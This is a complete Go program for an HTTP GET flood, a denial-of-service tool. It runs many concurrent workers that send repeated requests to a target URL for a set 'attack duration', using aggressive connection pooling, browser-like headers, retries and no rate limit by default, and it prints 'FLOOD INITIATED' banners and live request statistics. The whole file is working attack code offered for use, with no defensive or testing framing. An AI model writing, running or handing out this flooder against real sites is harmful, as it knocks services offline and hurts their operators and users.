package main

import (
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"runtime"
	"sync"
	"sync/atomic"
	"time"
)

type EnhancedFloodConfig struct {
	URL           string
	Workers       int
	Duration      time.Duration
	Timeout       time.Duration
	UserAgent     string
	Headers       map[string]string
	MaxConns      int
	KeepAlive     bool
	DisableTLS    bool
	RateLimit     int64  // Requests per second limit
	BurstSize     int    // Burst size for rate limiting
	RetryAttempts int    // Number of retry attempts
}

type EnhancedStats struct {
	TotalRequests     int64
	SuccessRequests   int64
	FailedRequests    int64
	RetryRequests     int64
	ConnectionErrors  int64
	TimeoutErrors     int64
	StartTime         time.Time
	LastSuccessTime   int64
}

func (s *EnhancedStats) IncrementTotal() {
	atomic.AddInt64(&s.TotalRequests, 1)
}

func (s *EnhancedStats) IncrementSuccess() {
	atomic.AddInt64(&s.SuccessRequests, 1)
	atomic.StoreInt64(&s.LastSuccessTime, time.Now().Unix())
}

func (s *EnhancedStats) IncrementFailed() {
	atomic.AddInt64(&s.FailedRequests, 1)
}

func (s *EnhancedStats) IncrementRetry() {
	atomic.AddInt64(&s.RetryRequests, 1)
}

func (s *EnhancedStats) IncrementConnectionError() {
	atomic.AddInt64(&s.ConnectionErrors, 1)
}

func (s *EnhancedStats) IncrementTimeoutError() {
	atomic.AddInt64(&s.TimeoutErrors, 1)
}

func (s *EnhancedStats) GetStats() (int64, int64, int64, int64, int64, int64) {
	return atomic.LoadInt64(&s.TotalRequests),
		atomic.LoadInt64(&s.SuccessRequests),
		atomic.LoadInt64(&s.FailedRequests),
		atomic.LoadInt64(&s.RetryRequests),
		atomic.LoadInt64(&s.ConnectionErrors),
		atomic.LoadInt64(&s.TimeoutErrors)
}

type RequestPool struct {
	pool sync.Pool
}

func NewRequestPool(url string) *RequestPool {
	return &RequestPool{
		pool: sync.Pool{
			New: func() interface{} {
				req, _ := http.NewRequest("GET", url, nil)
				return req
			},
		},
	}
}

func (rp *RequestPool) Get() *http.Request {
	return rp.pool.Get().(*http.Request)
}

func (rp *RequestPool) Put(req *http.Request) {
	// Reset request for reuse
	req.Header = make(http.Header)
	rp.pool.Put(req)
}

func createHyperOptimizedClient(config *EnhancedFloodConfig) *http.Client {
	// Hyper-optimized transport for maximum performance and reliability
	transport := &http.Transport{
		DialContext: (&net.Dialer{
			Timeout:   15 * time.Second,  // Generous timeout for connection establishment
			KeepAlive: 120 * time.Second, // Extended keep-alive
			DualStack: true,              // IPv4 and IPv6 support
		}).DialContext,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify:     config.DisableTLS,
			MinVersion:             tls.VersionTLS12,
			MaxVersion:             tls.VersionTLS13,
			SessionTicketsDisabled: false,
			Renegotiation:          tls.RenegotiateNever,
			ClientSessionCache:     tls.NewLRUClientSessionCache(1000),
		},
		// Aggressive connection pooling
		MaxIdleConns:          config.MaxConns * 4,
		MaxIdleConnsPerHost:   config.MaxConns * 2,
		MaxConnsPerHost:       config.MaxConns * 5,
		IdleConnTimeout:       300 * time.Second,
		TLSHandshakeTimeout:   15 * time.Second,
		ExpectContinueTimeout: 3 * time.Second,
		ResponseHeaderTimeout: 20 * time.Second,
		DisableKeepAlives:     !config.KeepAlive,
		DisableCompression:    true,
		ForceAttemptHTTP2:     true,
		WriteBufferSize:       64 * 1024, // 64KB buffers
		ReadBufferSize:        64 * 1024,
	}

	return &http.Client{
		Transport: transport,
		Timeout:   config.Timeout,
	}
}

func enhancedWorker(ctx context.Context, client *http.Client, config *EnhancedFloodConfig, stats *EnhancedStats, wg *sync.WaitGroup, requestPool *RequestPool) {
	defer wg.Done()

	// Advanced adaptive backoff system
	baseBackoff := 1 * time.Millisecond
	maxBackoff := 500 * time.Millisecond
	currentBackoff := baseBackoff
	consecutiveFailures := 0
	lastSuccessTime := time.Now()

	// Rate limiting
	var lastRequestTime time.Time
	requestInterval := time.Duration(0)
	if config.RateLimit > 0 {
		requestInterval = time.Second / time.Duration(config.RateLimit)
	}

	for {
		select {
		case <-ctx.Done():
			return
		default:
			// Rate limiting
			if config.RateLimit > 0 {
				elapsed := time.Since(lastRequestTime)
				if elapsed < requestInterval {
					time.Sleep(requestInterval - elapsed)
				}
				lastRequestTime = time.Now()
			}

			stats.IncrementTotal()

			// Get request from pool
			req := requestPool.Get()
			reqCtx, cancel := context.WithTimeout(ctx, config.Timeout)
			req = req.WithContext(reqCtx)

			// Set optimized headers
			req.Header.Set("User-Agent", config.UserAgent)
			req.Header.Set("Accept", "*/*")
			req.Header.Set("Accept-Encoding", "identity")
			req.Header.Set("Connection", "keep-alive")
			req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
			req.Header.Set("Pragma", "no-cache")
			req.Header.Set("Accept-Language", "en-US,en;q=0.9")
			req.Header.Set("DNT", "1")
			req.Header.Set("Upgrade-Insecure-Requests", "1")
			req.Header.Set("Sec-Fetch-Dest", "document")
			req.Header.Set("Sec-Fetch-Mode", "navigate")
			req.Header.Set("Sec-Fetch-Site", "none")

			// Add custom headers
			for key, value := range config.Headers {
				req.Header.Set(key, value)
			}

			// Retry logic with exponential backoff
			var resp *http.Response
			var err error
			retryCount := 0

			for retryCount <= config.RetryAttempts {
				resp, err = client.Do(req)
				
				if err == nil {
					break // Success, exit retry loop
				}

				// Categorize errors
				if netErr, ok := err.(net.Error); ok {
					if netErr.Timeout() {
						stats.IncrementTimeoutError()
					} else {
						stats.IncrementConnectionError()
					}
				} else {
					stats.IncrementConnectionError()
				}

				retryCount++
				if retryCount <= config.RetryAttempts {
					stats.IncrementRetry()
					// Exponential backoff with jitter
					backoffTime := time.Duration(retryCount) * currentBackoff
					if backoffTime > maxBackoff {
						backoffTime = maxBackoff
					}
					time.Sleep(backoffTime)
				}
			}

			cancel()
			requestPool.Put(req)

			if err != nil {
				fmt.Printf("[ERROR] Request failed after retries: %v\n", err)
				stats.IncrementFailed()
				consecutiveFailures++
				
				// Adaptive backoff on persistent failures
				if consecutiveFailures > 5 {
					time.Sleep(currentBackoff)
					if currentBackoff < maxBackoff {
						currentBackoff *= 2
					}
				}
				continue
			}

			// Handle response
			if resp != nil {
				// Efficient body handling with size limit
				if resp.Body != nil {
					limitedReader := io.LimitReader(resp.Body, 2*1024*1024) // 2MB limit
					io.Copy(io.Discard, limitedReader)
					resp.Body.Close()
				}

				// Success tracking with status code logging
				if resp.StatusCode >= 200 && resp.StatusCode < 400 {
					fmt.Printf("[SUCCESS] Status: %d OK\n", resp.StatusCode)
					stats.IncrementSuccess()
					consecutiveFailures = 0
					currentBackoff = baseBackoff // Reset backoff
					lastSuccessTime = time.Now()
				} else {
					fmt.Printf("[FAILED] Status: %d %s\n", resp.StatusCode, http.StatusText(resp.StatusCode))
					stats.IncrementFailed()
					consecutiveFailures++
				}
			}

			// Intelligent yielding
			if consecutiveFailures == 0 && time.Since(lastSuccessTime) < 100*time.Millisecond {
				runtime.Gosched()
			}
		}
	}
}

func printEnhancedStats(stats *EnhancedStats, duration time.Duration) {
	total, success, failed, retries, connErrors, timeoutErrors := stats.GetStats()
	elapsed := time.Since(stats.StartTime)
	rps := float64(total) / elapsed.Seconds()
	successRate := float64(success) / float64(total) * 100

	fmt.Printf("\n=== ENHANCED ULTRA FAST FLOOD RESULTS ===\n")
	fmt.Printf("Duration: %v\n", elapsed)
	fmt.Printf("Total Requests: %d\n", total)
	fmt.Printf("Successful: %d (%.2f%%)\n", success, successRate)
	fmt.Printf("Failed: %d\n", failed)
	fmt.Printf("Retries: %d\n", retries)
	fmt.Printf("Connection Errors: %d\n", connErrors)
	fmt.Printf("Timeout Errors: %d\n", timeoutErrors)
	fmt.Printf("Requests/sec: %.2f\n", rps)
	fmt.Printf("Success/sec: %.2f\n", float64(success)/elapsed.Seconds())
	fmt.Printf("==========================================\n")
}

func main() {
	// Enhanced command line flags
	url := flag.String("url", "", "Target URL (required)")
	workers := flag.Int("workers", runtime.NumCPU()*2, "Number of concurrent workers")
	duration := flag.Duration("duration", 10*time.Second, "Attack duration")
	timeout := flag.Duration("timeout", 45*time.Second, "Request timeout")
	userAgent := flag.String("user-agent", "EnhancedFlood/2.0 (Ultra-High-Performance HTTP Client)", "User-Agent header")
	maxConns := flag.Int("max-conns", 2000, "Maximum connections per host")
	keepAlive := flag.Bool("keep-alive", true, "Enable HTTP keep-alive")
	disableTLS := flag.Bool("disable-tls", false, "Disable TLS verification")
	quiet := flag.Bool("quiet", false, "Quiet mode (no real-time stats)")
	rateLimit := flag.Int64("rate-limit", 0, "Requests per second limit (0 = unlimited)")
	retryAttempts := flag.Int("retry", 3, "Number of retry attempts per request")

	flag.Parse()

	if *url == "" {
		fmt.Println("Error: URL is required")
		fmt.Println("Usage: go run enhanced_flood.go -url=https://example.com [options]")
		flag.PrintDefaults()
		return
	}

	// Optimize Go runtime
	runtime.GOMAXPROCS(runtime.NumCPU())

	config := &EnhancedFloodConfig{
		URL:           *url,
		Workers:       *workers,
		Duration:      *duration,
		Timeout:       *timeout,
		UserAgent:     *userAgent,
		Headers:       make(map[string]string),
		MaxConns:      *maxConns,
		KeepAlive:     *keepAlive,
		DisableTLS:    *disableTLS,
		RateLimit:     *rateLimit,
		RetryAttempts: *retryAttempts,
	}

	stats := &EnhancedStats{
		StartTime: time.Now(),
	}

	fmt.Printf("🚀 ENHANCED ULTRA FAST HTTP GET FLOOD INITIATED\n")
	fmt.Printf("Target: %s\n", config.URL)
	fmt.Printf("Workers: %d\n", config.Workers)
	fmt.Printf("Duration: %v\n", config.Duration)
	fmt.Printf("Timeout: %v\n", config.Timeout)
	fmt.Printf("Max Connections: %d\n", config.MaxConns)
	fmt.Printf("Keep-Alive: %v\n", config.KeepAlive)
	fmt.Printf("TLS Verification: %v\n", !config.DisableTLS)
	fmt.Printf("Rate Limit: %d req/s\n", config.RateLimit)
	fmt.Printf("Retry Attempts: %d\n", config.RetryAttempts)
	fmt.Printf("==========================================\n")

	// Create hyper-optimized HTTP client
	client := createHyperOptimizedClient(config)

	// Create request pool for efficiency
	requestPool := NewRequestPool(config.URL)

	// Create context with timeout
	ctx, cancel := context.WithTimeout(context.Background(), config.Duration)
	defer cancel()

	// Start enhanced workers
	var wg sync.WaitGroup
	for i := 0; i < config.Workers; i++ {
		wg.Add(1)
		go enhancedWorker(ctx, client, config, stats, &wg, requestPool)
	}

	// Enhanced real-time stats display
	if !*quiet {
		go func() {
			ticker := time.NewTicker(1 * time.Second)
			defer ticker.Stop()
			for {
				select {
				case <-ctx.Done():
					return
				case <-ticker.C:
					total, success, failed, retries, connErr, timeoutErr := stats.GetStats()
					elapsed := time.Since(stats.StartTime)
					rps := float64(total) / elapsed.Seconds()
					successRate := float64(success) / float64(total) * 100
					fmt.Printf("\r\n=== ENHANCED LIVE STATS ===\nReq: %d | Success: %d (%.1f%%) | Failed: %d | Retry: %d | RPS: %.0f | Conn Err: %d | Timeout: %d\n===========================\n", 
						total, success, successRate, failed, retries, rps, connErr, timeoutErr)
				}
			}
		}()
	}

	// Wait for all workers to complete
	wg.Wait()

	// Print final enhanced statistics
	printEnhancedStats(stats, config.Duration)

	log.Println("🎯 Enhanced ultra fast flood completed successfully!")
}
